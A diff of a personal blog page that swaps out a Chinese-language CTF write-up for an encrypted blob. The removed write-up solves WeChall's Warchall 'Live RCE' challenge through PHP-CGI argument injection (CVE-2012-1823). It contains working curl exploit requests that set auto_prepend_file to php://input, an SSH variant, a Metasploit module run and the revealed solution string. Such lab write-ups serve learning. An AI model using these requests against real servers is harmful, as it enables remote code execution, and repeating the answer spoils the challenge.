@@ -22,19 +22,20 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="Challenge Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，并读取 challenge solution。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php Recon 先看源码。PHP-CGI 模式下 -s 参数会泄露源码而不是高亮输出： 1$">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WeChall - Warchall - Live RCE">
 <meta property="og:url" content="https://vkkkv.github.io/wp/WeChall/wechall-warchall-live-rce/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="Challenge Warchall 服务器上的 Live RCE 题目，目标是证明对 rce.warchall.net 的可控命令执行，并读取 challenge solution。 WeChall 页面只给入口和提交框，真正的靶机在： 1https:&#x2F;&#x2F;rce.warchall.net&#x2F;index.php Recon 先看源码。PHP-CGI 模式下 -s 参数会泄露源码而不是高亮输出： 1$">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-26T08:19:57.000Z">
-<meta property="article:modified_time" content="2026-09-15T02:12:10.453Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.180Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="php-cgi">
 <meta property="article:tag" content="rce">
+<meta property="article:tag" content="restricted-wechall">
 <meta property="article:tag" content="warchall">
 <meta property="article:tag" content="wechall">
 <meta property="article:tag" content="writeup">
@@ -208,7 +209,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -221,10 +222,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#recon"><span class="nav-number">2.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vulnerability-php-cgi-argument-injection"><span class="nav-number">3.</span> <span class="nav-text">Vulnerability: PHP-CGI
-Argument Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80phpinput%E7%BA%AF-http%E4%B8%8D%E9%9C%80%E8%A6%81-ssh"><span class="nav-number">4.1.</span> <span class="nav-text">方法一：php:&#x2F;&#x2F;input（纯
-HTTP，不需要 SSH）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8Cssh-auto_prepend_file"><span class="nav-number">4.2.</span> <span class="nav-text">方法二：SSH +
-auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89metasploit"><span class="nav-number">4.3.</span> <span class="nav-text">方法三：Metasploit</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -245,12 +242,12 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -323,7 +320,7 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:12:10" itemprop="dateModified" datetime="2026-09-15T10:12:10+08:00">2026-09-15</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -365,83 +362,31 @@ auto_prepend_file</span></a></li><li class="nav-item nav-level-4"><a class="nav-
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="challenge">Challenge</h3>
-<p>Warchall 服务器上的 Live RCE 题目，目标是证明对
-<code>rce.warchall.net</code> 的可控命令执行，并读取 challenge
-solution。</p>
-<p>WeChall 页面只给入口和提交框，真正的靶机在：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rce.warchall.net/index.php</span><br></pre></td></tr></table></figure>
-<h3 id="recon">Recon</h3>
-<p>先看源码。PHP-CGI 模式下 <code>-s</code>
-参数会泄露源码而不是高亮输出：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://rce.warchall.net/index.php?-s&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>页面源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) ? (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="string">&#x27;Guest&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Live RCE [Warchall]&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Live RCE!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Hello <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$username</span>; <span class="meta">?&gt;</span>!&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Here are your <span class="variable">$_SERVER</span> vars:&lt;/p&gt;</span><br><span class="line">&lt;pre&gt;<span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>); <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>两个关键发现：</p>
-<ol type="1">
-<li><code>-s</code> 生效了，说明 URL 参数直接传给了 PHP-CGI
-解释器，而不是被 Apache 吞掉。</li>
-<li>源码里 <code>require '../config.php'</code>，solution
-大概率藏在那里。</li>
-</ol>
-<h3 id="vulnerability-php-cgi-argument-injection">Vulnerability: PHP-CGI
-Argument Injection</h3>
-<p>当 PHP 以 CGI 模式运行时（<code>php-cgi</code>），命令行参数可以通过
-URL query string 传递。这不是 bug，是 CGI 协议的设计：query string
-本来就是传给程序的。PHP-CGI 会解析以 <code>-</code>
-开头的参数，就像命令行 <code>php -d key=value -s file.php</code>
-一样。</p>
-<p>CVE-2012-1823 记录了这个漏洞。受影响的是所有以 CGI/FastCGI
-模式运行且没有做参数过滤的 PHP 部署。</p>
-<p>核心 payload 参数：</p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-s</code></td>
-<td>泄露源码（syntax highlight）</td>
-</tr>
-<tr>
-<td><code>-d key=value</code></td>
-<td>覆盖 php.ini 配置项</td>
-</tr>
-<tr>
-<td><code>-n</code></td>
-<td>不加载 php.ini</td>
-</tr>
-</tbody>
-</table>
-<h3 id="exploit">Exploit</h3>
-<h4 id="方法一phpinput纯-http不需要-ssh">方法一：php://input（纯
-HTTP，不需要 SSH）</h4>
-<p>通过 <code>-d</code> 覆盖两个关键配置：</p>
-<ul>
-<li><code>allow_url_include=On</code>：允许 include 远程/流包装器</li>
-<li><code>auto_prepend_file=php://input</code>：在每个 PHP 文件执行前先
-include 请求体</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s -X POST \</span><br><span class="line">  <span class="string">&#x27;https://rce.warchall.net/index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>输出：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">YOU WIN!</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;ICANHAZRCE&#x27;, &#x27;StrongGard_6_3&#x27;);</span><br><span class="line">return ICANHAZRCE;</span><br><span class="line">?&gt;</span><br><span class="line">YOU WIN!</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p><code>YOU WIN!</code> 是 <code>config.php</code> 里预设的标志。后面的
-HTML 是正常页面渲染，因为 <code>auto_prepend_file</code> 在 index.php
-执行前已运行 payload。</p>
-<h4 id="方法二ssh-auto_prepend_file">方法二：SSH +
-auto_prepend_file</h4>
-<p>如果有 Warchall SSH 访问权限，可以先在服务器上放一个 PHP 文件，然后用
-<code>auto_prepend_file</code> 指向它：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SSH 上去写文件</span></span><br><span class="line">$ ssh -p 19198 user@warchall.net</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php echo file_get_contents(&quot;../config.php&quot;); ?&gt;&#x27;</span> &gt; /var/tmp/s.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后触发</span></span><br><span class="line">$ curl <span class="string">&#x27;https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>结果要「查看源码」才能看到，因为 PHP 输出混在 HTML
-里，浏览器渲染后不可见。</p>
-<h4 id="方法三metasploit">方法三：Metasploit</h4>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line">set RHOSTS rce.warchall.net</span><br><span class="line">set TARGETURI /index.php</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">StrongGard_6_3</span></span>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="0dcf95299547d4d420e1b7efb239a2c5520330da9f2954cde1bbe0d40b468c88"
+     data-nonce="c521c173d56cb096c9852726"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    ab7a305bc99f37660ef3fa8e5e332bc6fb0ef342ef6372ace91dd14b99f8e4961f5739e0f7845c63351eee74f17c7bd5c3ba9527f8cb1c28d4e1c150491e633c58a17c9932e14ea06f70bd7ae91d8431d2855c7ec63609724367feee6baa9efa0aee2053da62776f106d45470662df0c0dd71a088572a74e6e414c4f772a9dfee209630602f8e810d05f9cf6399db95dc5aec01a7b6c393e1badc96bda0329ff0943bb343d7adae7db93413b50bd8500465bacdf293bf18714932b2fb6e5992255fb878be098adedaf12d5ea00c0a911e85cdc5d98f5b1aeba3a6790a504c970b29525a75509bab0319391b2ac36184346784aadb6a7316f5e7fcf94a99c2d3c1864415c8f8db23b30343c510319a6549395e1638c76e90b2bf808abfcb115eb89fb397b5bb4a5583239721605cce83536cd81a7c6e61ebe0dfd370bc1f67c5796f0b25a06f586da444ea2c4773f4a00db84771e1a17761ff994221e7bb55c6215b9f95d61e9a1e3ad5fd47d540ace3162db60a7861703ef5a62bbae2fdbd73e52fdea8fef1df817f13a12b7510915cb0b50aa8e56a55a28e54ebfd7ac25ea2e118715ea01be938e64ae7e209826e8ed3675b6049acb7f443ca394f8d8d6cfd5e800d2d8a07fa9cc47831bfd92d83e5aa15c28211875f7ede2109bc04822fc61e7b875a0d0a4e1f651c8d1456fcc2c4ffcbfa02c2a60010fe649d096bb26339d4fdde93fc6fac27c8f9e20ad2792e85eeebfd39129700bac4b9f0abe7772329cf054411935c6fc867a4e72a740af3d45eb2e72fca2c12f35f670b73b93c184e5f46d527cc73bb9e5420b0016a62a17da23681d81a884a12f2f1318d660676bcde91648b46f07e1344c9a313e5cd402a79967e6775f23ccbdcfd62c22b5240d3d80bea31c2cb44029faf2480122fcd1e241ee787ceea4e0370a5be7a463be82a5774c74a00a99869f1e738106f8ebfd39cfd53472f8a9286f3eab5bb2564f4abc846ee3c2f24d0ab612d8ce044ce19fe7ed11f7a2b3644c1a81b8dc39641255bb8fad1ae1f1bf0941507cd89e7c537ae0bce896129a8cd1bb18bbea8b60cc9649ea47c87c604fde8730dc9575ecf5b8baacfbd2003856b9c840e83122eccb201f66b2c2575d418f0f8a11ce7af0cd849f4b6c97456a3b56c87e59bcaf5aed5e094a04ca086494a33d15bd7df9214ffb8a617a2f18f11babe1478820e435bc080e564ce2dede197e420d44dbdee50d0adaf259ca054dc55e3975c639484a8020c8ece1f7bdc7f3d32d96fa05df6be8a96b0f8840bf22aa4481231ec3f442fd6b8aa152505dc5806af2d4fbcc3ec6c45aca5c1fcd1c1209ebfba10e6518b4e6b48d3ee9280a95f4471ad0403d327d1fca5d70554e74010c004c2f894a53835b3b209ddd0c3ab5ff9d86e97ca7234ae7349a0428cc6bbc19e32925e07b779bd5adbc4769a3d5c10c423ba56eec1a7d070becc544b9cceb6cd5185f1440125819237a392a0eb3551679ad3fcb8aa145f1bbcf8f467dbb76a8724bd6e6eb2fac62f95530f930d860bb705ebad2d29bb3964112872c8bcdeaeba7e5d9ede3a3ced7689187cf1d8f0d26d0f97535ddabe3dfe055be87b28c330df9f0f2bb17dd039cba6d006bf22f9ae13c3ae419c1f26a5155f28a089a353fcab476180453f2a964fae1683b1939740fa40a410a3cfc9f3cfad50086e9542b7f80218819509186cc462323e10861bc89078d88f8027c757185fe32aaf5f7d7c813f33f2ba67a2c30331e542f04e40204f1839b7aa5cf7602ce3dcfd4113a4e14f8694a10cd84f4504e14f1ae88772c0c0adac4f02331fc296af571b8f022aea9c7fa6af925df2199d07f12152fcf6de44a391cac283c9327bd04fc6659dd9a0df84d0cb5f5013ccfdb78c8b2111a932e13337a94c242e68eb0a95d9d9effbeac93efdc8a1aec02bd32957beb715cba469d4fc4077135d59cdaa79f7a8e52013e3f8a73f0e6999f6fd3f375948c5e67d058d9012d03c3504319015300cc0d0fb528d9f70cc496b268d635c8760ccdf512176f45a67421034f898c239d9e8cb06f5fd0a13a1483a004e67e2233a6ed3a777409a5ec6a09e92d4ca7e9612eec503c2d6c874bdac3adcba6bc50848a768381ac5bd14b4a36a66d900023ac466eba5c6292f3a9de7e29b89f28e2df11a13e90399a4fbdcde9646694c32bb7a2eda2fb5b8128b555dc85a446aff4eeec0694b53d7875d1a3552deb667abd40408a580cab1013679faed09c1524eb3d1b74bb145cd4fa207d8c696a545d2a4a5e9ff5a4e953246c123b0a3da68edb3d4ac1dc1537947092ef705147fc830a3011a99255ca580913f635a8ce31e604d1fcbcbe2f2555622df9cf8c6cd455755907f02711db42ef36c747b900b0119b1fbe164ddbf5c7b0413780be272d71772f5f1708da2289c0b3967f5e8c76addeda9bff1ecb1c0a00b838698bfb36848d9e2fcf3c986729f38c8d9d3abf18484403c88241b360df604e990e1db52abcca673d717b59abcc503a6c42af308d8c525ba3f79ba29bdff529aad4c5ff0e78c66bdde2cde8b97f2ac5e049a5f1704c2bae1e9d117e2ab40019231794df7ec6d6487eb1370e1817fde83e026eff9f865678fb74f2bdc4f8fa0cb2fd952c48949e70a8689d7377b040632ffb7ce8e1cf4efd2881a97b2e1a2a608266abf4202dafd312251b4568b947374d3615d82d627fdf9a274d337d537fcab13ace81bf4ef2f464a48140b526935497ced50aadcac176ff86e6c42c02935a93b5ac4ad6f645fffb2ff2b31885ec57a42686bf4b3415d984523d83a10e3b18b434503e1ab07d9a96f947fab96add569fc43c9ee6cb1200cc4fae2edf1a7958e0f122d3d7cc60e069ce7ba35bb8c4cd9c0aaee58f20ef762cc18303593d32273fd87b0acc7e3ba25190c08b4390aa7c3cb243c268857306b2b63156b413a7c08cea0f0f4786019f7c0033ea8886c33fed213944f2d072f34d62e347bea174759bc4c83fd3d78cf209bcabb9524d2ddfc1169ef687673f5f382e54df53c563468639104f71d2d10a27807f9829c0c17091010fa596543eb8732e4d0af89fa8833f3ee3623a262bd4f58b824974e23ace9a718f86f5973cc55bcc1d74b7334086e94d3026d4479c3faf7553ef3218aa1527eb53b8d2e0d41f2ed875180267905ce9cf1dda8da43ec951b3b8a419312477259b79dd654adb8f3f30732719ae1eab14926eb97dbd7eb5fefffb0c755fc5d086b9498864ad4bb25afca6205a7ee61f6c271a67b3a549a951c3959de44fcfdf1332f1a7bdb35aaa7b292eb60bb9622fa8aefdf7abbd7af575edd440f79932e504950d023d072a769a428c6f9e5b345370642398a6078b81bb99f946c12d82b9495b56595e91dd42c9b854abf691b9130ec0d30c2a65ccdb5e1ab242728203b93ab4e45b3fb31d1ba53e6addb9bb7433db557feb008317236a88d417a4f78301f5df93bac9ef76b7960612066d1a52487bb42f1d70fd6e51a63f1dbb5b0d542de4153b15ffea35e16bae24b2cc02b691622a6aeb14a2d743665017f39012638061b3a28ba8b11d3a4b37082bc3122b1ddc63ca75c4aadc233dd92192ea4249c8cc60d3686b744d6fc521df2231d46c37856eaead883402ad92306c1875cda22f8811a7fee48398d3381d42b52be5d5c8567def6bce57b7ce1d49dc092fa22246d1fe4cdb767d8b96dfa33d7a289eb759ad7dd8579ffe7b4c8416987c677fcbc15921cc90f95fb3be1e2cf831d60040b7c0d56643bd6c806b2c200d4e38bae41477283ae78738f5c56787c8cdcc536e084137cbc0a31f79b7c361a890ac28d5df923db2e6020b64d8b562fea5e4c9d46ff0ec3fd46da8d0dd866ae77f670be47986498c305e95b5027e09610430366cbc1bd1ab5ed011fccc568f13a50e4567114f9a9b395dab55c6b464511264a0934a861fb7f0f8eba8d96adc295b550a8f7e60bb93d1143a495048cf016ad5115e5a96134f438172b6f117d1954c64aa3079964ff5f5cc84d434d4d828295e803c48bbcb75786a6d91865f748af48f47f87a5fc432cac074483428b8306f2fcfa3c4dfb51fa8962118858443cc7467ebe6cb5697bf5823b497136f68d410c62b3933a06f1f89ad4f28a930818f520c0c8024e7742e406a06b976210306fb213d72a0c9098973683a9296af9dd4d5ce3d1f3045c0df6501534ee5af107c6d276bf63cac3a229a76a697d876e782014af331f1fbe25cc6b887b536d00666102e7f4e36f017aa87e686008701e2d1459f63ee174d3f2c1896b14436dee3e5c3feac73b57857a3c27617518c9cfd4b839916f05b65a6a22a1a5d8787aa76b649ac6f30bf95fcb50daebfe372285b9ceff15a03f5106fa6b11e1a92f8b90f15637b59b1145a75f2cbeb5dc2d32defc42eab8f0d9e67f79e2b4f75e82332caa6fe5bca8255f1070a5c4401b0c30a76e2b2b3e69681f35e8565f8dda4075bd88d6c3f9790721c9f81999d811c87d362e19e1982b7c4795050bf9dc4d71a631c6e9c2f35592569e54164a682ab013fb224b7efe10e9e6ed1e70672712512afe90cdbbcbfd0b7d296bdedcd581f04a5460b2ce221f994eef93f3cebef4d7afcd672d1df33925a6e9f867ec16031e74915df82f87e630f60867f99a990eb8eeebac4732802213596102556c59f410b5c3b2dda8ff1a8e23aba3d24d2ebf7a91eaa99d9965091f470ce98ab984c6b0de3540962a5e5d4f58616005e8eb5931784fc7eb90072a4f17050f150cafd03c2122bdb414d3bfac76c7fceb4a721aa0a74246fe47b46d27bedd91a0907d76f8b6fb01217ef012abb8c4d6747d2c29b401695d33478eb751fe9f88c50ea2f77c538ab41824eb664cc533ab1ac0eceab3895f0ecd21961bc996ba5f709bf9f3f45b692451d5f146a60bcf78b1d898d59a9a2581e6db10c72ef89c1a442472c39a7ac376ec503f88a1827c2942dd030bceb518dfe24b3ad36189f8a112852ab947523503647caa0f8e11d1e0ee93ae60d94ce986555c07ce064a5562535e964cf6287bf2e241d82116c856ef3ecd5eda166ebfcf6c038dfaaf23549cdb62177512a0daac757eadd53f35e90402b01498d5f81421a20070365ffcbf18d00163b6ff95b10f7f12d6b8a1f502414e395d647c253db8dbf4d3911a92701d750460fe66912bed46482cba701e6566aac93b360c9e1570b81da7849e690e94b12306ee99eb2525ad768f5dab827c93c4b398937be44af9b73610ee8589760cc30e64c9b892aa16f99d41d8bd470e0bb3b7a1db1e4535c1be3995334520c11506b89262f1b7e31919016349ba650dd3b2eda391686020f0d403334ddf90ae3be24774fa3111b4e522a199f78531bb94077c8a0dd8a9b7f1d4f87c111fdf089bcc4a941fd9a498b8a5dcc5a64ea4b74eaf4c4af771684ead9aeea9b44bb342a38fcdfeb9a4eab7af1815d6149feefddf9d28c14c6129b551e1177340063c3ae99f2f72f19d4fc07183f9dd67817cb06cb09d9fdb03ef6680fc5685723bf9f6c91fc7000ec7c8440ba7c71d9f5aeabed62de8f4bdd18b3ab95e4a0bcfe591f3cd850f2764e9792defc39bc7503d09afd44f3572e661685a1599d9098bf22df237c3194b68931abc65010ed9ebd328007f9c678d777856c8edee80fa7c109a6f59aeb4c28d84fd8fd13b78c2c08ffacf5a20e88909329e0a26344d35a3a8e65aa0349772f95cb1212f7967d99208ed659237bd7f34b443b422483689f2f265e89c375ea66389ed468e0882a5b7c4a7924bee392344ad6f99f6cd097924b78aaf5a13920617b40adce28806d3b8d32b354a09882a5617294e978f2842fdfbafdf5e3cefc2b43f1d44e1184940e3da61a82cad0a53bc74529328d3d888cb288ced035671ee1b695ad282422bc76e38e0d95a88e9eea5267fb2e6a489cdfb22d9274cf6a468c897edbba2fdf4bfeab650232e989f08d0c12d3bd6469b317fe484bef1d7806aa2d5dd218991407c428c80b4da262c57289c9a71cc33032fe1eea08b04518cb516c168d1de316b164bb7470920d6004294fa6937c4ebaed962b6c70d2c1276c9ad40871349beedfcb6401aeb208544902072c8d660ac89ec996c49b1eca80b2e4b03271283f1562465bb348035b97740e8e2273d42649bc509233060c71b6ff2798036b15e971c3b472a98caed577967dfe0445ec91e9b7dc4be8c0b5341a45ce84d1a040f68ad6fde197d09546790171af17fc264f36c84437f555a4365f432c468c68ab1b020e139e0ee4397059440662f3f70d3a8f0212d1f8f524c80f57ad6dceb2a7fc1a2302c24a982ad98dad6aa56ae5599870eb96a22193ffb801ff5e23a9c04e0f6d9d59e9fbd9697081dc4221024a6a20d6c01a3bf7a946addeedabb8654359767bb6e6014367ba91370dad4fd09695e216af6be0a7ee07f8881ecf1adf9192079cf1ce3ed57a39bce9edc4c108b9c2047398eedee83fcda2b4137c54a752a470c09244ce5ac60eb7f5fd3c5c7802c31c2e2bbf18bde38f127f2be2462815931d82f2545aa5749be24b5ffd5e468e1ab697391267c3cf90e7b092104944c61c7cfa7e2092ab0d2b1183b458f2983ea2bc4193bb52bdd10bdd3d6c2f3018ef626111ceb9fd7bea51f017551e4c0ef0a682f6e1680531218b336d9d4f09707fa695e8446796e0e4b4385a5b639e63b72e54666ed124c543d6dea808f8505e8ec768c42d9e58823eef4bab9475e706273bacb6eedebd8aef329c8a1721c79a0d42316c8ffd4c352f4a83478d20ca835821ab21e4bcefddf49aa1e0c295a63468db29ff495b79970636dbdb44d9cf12297244c90368f6e173c0c5f0d59e90f9fa407ff179b49bf6f86c32a19912321dff66ba8d2da36e5b44d8252f3184586cfbb9fdb76fe51798b08d8ac170791b3260e7bf48d6046fd49aea2553d814b1a0ec40be1c81c237c93a7484bda8136aaa820c319a062576e5172a42344fd417f55747872ed08077aa1376414d5b05768c3d4ec5f3687146cb5e99ee53eb636fd569c5a5d9f9646b719f64c250045e7b573d17b556dab14926b285383251aec24f205a984b29c231d0686d44f9721f9c8d19138098c8fc49d3de585d902829974a6a136d704f678e1317a69e57b7d14e4644973f7d0e91549a1687b08f9c01f8b50a34bd299f5c534fd1bab357665e5421a57c62e19b2afdc39ad6f68d4ab15443cdef8433fdd50ded4a4fbaf48c5d590e40101ce94a64ef42253e6152a47ddcd6a760bf0b58247c505fec16d1ef5d3002f16bfdf6d17e98913e9df902ef02c86fbac90ed207943bc07b5cd260e3ba6417763036438e4b8a6e9f3c4a01802c17fbf108f3a718bb17bd20fb9a0189836f474a60db6876aa3a38548b920228e3fd5477828c174b0c82e875d8703eba68109c9add5e9fd084c9227c7410541d288a138a01a51294bd31a0bdaa2d3505185cbc3507d29453a60d1b84e66a95a8ad68aa31b978b6a3aed60db555bb7e80d55b7d79527d5cff7cc210f22c1f84476c7e378089e29dea3eb6403b594235aaa019630e2edecfb7e7421e517813a748e578f990d446fdc1826773f48b9567eace617a913d932240c4957407c99532222c4d58204d518b1887d8341a9ba8d3f9b34975b86a86dc3624fd691c2425405293a736472480d727853cbf284a04ccbc8cfaf8bd14e748c965b778511f6011dc8c29dc284dd3fcb877feca4731385bb5c85f65bef4a25b756422d9eadd647e426d9f3718870a287702b5a4f3a840dfb90325817b6057748f044b83cf77915b17ce322b603087638fa67e1d87ff3ba98a37b710be761b0d719eb8e16db3444017427dec813932efa153037885a10024bf2d8cabb2f47a45f8100421780e4757221a1a1750b04e07747502bee1974e20bbbf23d30f17380a816385d61b56bc5e33607e3183e96dc1bc92fb4cd15f94826ab142e17efcfc98fd07c7dd9655cf325afb2f4c0f56b0271fc5c3f34263ca89631d5414475a470c145fa9e3836312d230ae96f16a3993b0333e2425706652d31dd4ebdb8c05acf5ee8af558b94f244e29219b96e6e340a9c3efd1b5e0a4981292a033148494286869596101dd6e09987100645f71183393c325959fed939f5bd8d8640f1936db05dfd15dafefd48ccc18ee8e85ac97b396d2b39f3423d23b70a96266c27ca7f95d26241fd074203600727efe5d25585fc3125628d6f04685c01d2afc35bc9615f98a328f89bdd78ed846c2a393f2eab90d7fccf3698f9cc852a77d38ecb9e3d789d9e86cdc2c76fa7ef47363c68f40815005a16a049f7cb738d219c5858c6e521dd4a8447a9249859238918e77f721774f0df58354123a1db849b79b2703d29d33caef4e13b968894fe40dd4b4562c2c9da6c6bbcf50361d0a184aab8fb5a3eb373324fc017a9fbc4e7c66e5899551b8c4af37729834ac3a33898c7bd9df74ea708decbed611255747c3ae6cc4fa90989c89c23b06cec40f56b9778828f36da7f2175ddfa8956dc4479d9a1a6cf8782d21a31894cfd4030d30fa54e97243d5e2be94a8739709ea6c603c4898e02564fb8e916d335a26b7cdca8f06e8501595acf89652108756229f7aa687feddc937353396d8f128bd65206f1bc423ca97b714c0ffef38c8954a45dceaeb0a66bbfa00073b1e05e80b2c67da381273b896c2f8737dfc309cf4875edebf8919c450d8f8dcce1cb800826b3313cc9944a38af41a7c335079081b1001daf7e22407bf6a1e2a51fae917427ab6cf21afd622f547dd2851899c6